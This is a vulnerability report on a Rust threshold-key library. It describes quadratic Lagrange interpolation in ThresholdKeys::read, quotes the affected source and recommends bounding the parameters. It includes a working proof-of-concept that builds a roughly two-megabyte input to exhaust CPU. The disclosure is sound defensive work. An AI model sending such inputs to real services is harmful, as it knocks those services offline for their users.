### Title
Unbounded Lagrange interpolation in `ThresholdKeys::read` enables CPU denial of service - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts attacker-controlled `t` and `n` values, reads `n` verification shares, and then calls `ThresholdKeys::new`, which computes `t` Lagrange interpolation factors. [1](#0-0) [2](#0-1) 

Each interpolation factor iterates over all `t` included participants, making group-key derivation `O(t²)`. [3](#0-2) [4](#0-3) 

### Finding Description
The serialized format allows `t = n = u16::MAX` and `interpolation = Lagrange`. [5](#0-4) 

After parsing `n` group elements, `ThresholdKeys::new` constructs `included = 1..=t` and calculates one Lagrange factor per participant. [2](#0-1) [4](#0-3) 

For the maximum parameters, this executes approximately `65535 * 65534` inner-loop iterations, each performing two field multiplications, plus one field inversion per participant. [6](#0-5) 

A Ristretto-encoded input is only about two megabytes because `n` contributes one 32-byte point per participant. [7](#0-6) 

### Impact Explanation
An unprivileged party that can supply serialized `ThresholdKeys` bytes to this API can cause billions of field operations, monopolizing a CPU core and potentially making the calling service unavailable. [8](#0-7) [4](#0-3) 

This is an algorithmic-complexity denial of service: a small serialized input selects the maximum threshold size and triggers quadratic work during deserialization. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The malicious input requires no valid secret, signature, participant authority, or protocol cooperation; it only needs canonical scalar and point encodings. [11](#0-10) 

The issue is exploitable wherever attacker-controlled bytes reach `ThresholdKeys::read`, though applications that only deserialize trusted local key material are not exposed. [8](#0-7) 

### Recommendation
Reject serialized threshold parameters above a deployment-specific maximum before reading or processing `n` verification shares, or replace the per-participant `O(t)` Lagrange calculation with an `O(t)` product/factorial construction and batch inversion. [12](#0-11) [9](#0-8) 

### Proof of Concept
```rust
use frost::{
  curve::Ristretto,
  dkg::{Participant, ThresholdKeys},
};
use ciphersuite::{
  Ciphersuite,
  group::{ff::Field, Group, GroupEncoding},
};

let n = u16::MAX;
let t = n;
let i = Participant::new(1).unwrap();

let mut bytes = Vec::new();
bytes.extend(u32::try_from(Ristretto::ID.len()).unwrap().to_le_bytes());
bytes.extend(Ristretto::ID);
bytes.extend(t.to_le_bytes());
bytes.extend(n.to_le_bytes());
bytes.extend(i.to_bytes());
bytes.push(1); // Interpolation::Lagrange
bytes.extend(<Ristretto as Ciphersuite>::F::ZERO.to_repr().as_ref());

let generator = <Ristretto as Ciphersuite>::generator().to_bytes();
for _ in 0 .. n {
  bytes.extend(generator.as_ref());
}

// Performs billions of field operations while deriving the group key.
let _ = ThresholdKeys::<Ristretto>::read(&mut bytes.as_slice());
```

### Citations

**File:** crypto/dkg/src/lib.rs (L226-247)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L376-379)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

```

**File:** crypto/dkg/src/lib.rs (L573-631)
```rust
  /// Read keys from a type satisfying `std::io::Read`.
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
